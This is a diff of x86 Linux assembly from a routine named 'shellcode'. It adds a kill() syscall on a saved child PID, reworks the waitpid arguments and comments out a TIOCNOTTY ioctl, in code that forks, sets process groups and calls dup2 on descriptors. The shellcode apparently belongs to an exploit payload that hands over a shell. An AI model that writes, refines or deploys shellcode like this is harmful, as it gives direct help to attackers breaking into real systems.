@@ -5,8 +5,10 @@
 # http://foosec.pl/pub/info/syscalls_linux_2_2.html
 # dup2=63, read=3, write=4, close=6, fork=2
 */
-        .equ    SYS_waitpid,     7
-        .equ    SYS_setpgid,     57
+        .equ    SYS_waitpid,    7
+        .equ    SYS_setpgid,    57
+        .equ    SYS_kill,       37
+        .equ    childpid,   228
         .text
 .globl shellcode
 shellcode:
@@ -30,7 +32,7 @@ shellcode:
         movl    224(%ebp), %eax
         jmp     *%eax
 parent:
-        movl    %eax, 228(%ebp)
+        movl    %eax, childpid(%ebp)
 
         # setpgid()
 setpgid:        
@@ -48,11 +50,17 @@ setpgid:
         movl    $73, %ebx       # step 73
         cmpl    $0, %eax
         jl      erroutclose
-        
+
+        # kill()
+        movl    $SYS_kill, %eax
+        movl    childpid(%ebp), %ebx
+        movl    $9, %ecx
+        int     $0x80
+                
         # waitpid()
-        movl    %eax, %ebx
         movl    $SYS_waitpid, %eax
-        movl    %ebp, %ecx
+        movl    childpid(%ebp), %ebx
+        movl    $0, %ecx
         movl    $0, %edx
         int     $0x80
                 
@@ -93,14 +101,14 @@ setpgid:
         jne      errout
 
         # ioctl(fd, TIOCNOTTY, .)
-        movl    $54, %eax
-        movl    $0, %ebx         # fd
-        movl    $0x5422, %ecx    # TIOCNOTTY
-        movl    $0, %edx
-        int     $0x80
-        movl    $45, %ebx       # step 45
-        cmpl    $0, %eax
-        jl      erroutclose
+        #movl    $54, %eax
+        #movl    $0, %ebx         # fd
+        #movl    $0x5422, %ecx    # TIOCNOTTY
+        #movl    $0, %edx
+        #int     $0x80
+        #movl    $45, %ebx       # step 45
+        #cmpl    $0, %eax
+        #jl      erroutclose
 
         # dup2(n, 0)
         movl    $63, %eax
